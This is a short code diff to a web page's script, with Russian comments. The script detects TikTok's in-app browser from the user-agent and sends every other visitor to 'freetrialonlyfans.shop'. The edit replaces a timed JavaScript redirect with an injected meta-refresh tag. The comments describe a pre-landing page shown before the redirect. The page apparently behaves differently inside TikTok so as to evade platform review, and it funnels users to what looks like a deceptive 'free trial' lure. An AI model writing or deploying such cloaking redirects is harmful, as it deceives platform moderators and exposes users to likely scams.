@@ -37,13 +37,14 @@
             return userAgent.includes("tiktok") || userAgent.includes("musically");
         }
 
-        // Если не TikTok WebView, выполняем редирект
+        // Внешний редирект для обычных браузеров
         window.onload = function () {
             if (!isTikTokWebView()) {
-                // Задержка перед редиректом в обычном браузере
-                setTimeout(function() {
-                    window.location.href = "https://freetrialonlyfans.shop/";  // Ваш сайт для редиректа
-                }, 1000);  // Задержка 1 секунда, чтобы показать преленд перед редиректом
+                // Для обычных браузеров, редирект через мета-тег
+                const meta = document.createElement("meta");
+                meta.setAttribute("http-equiv", "refresh");
+                meta.setAttribute("content", "3;url=https://freetrialonlyfans.shop/");  // Редирект на основной сайт
+                document.head.appendChild(meta);
             }
         };
     </script>
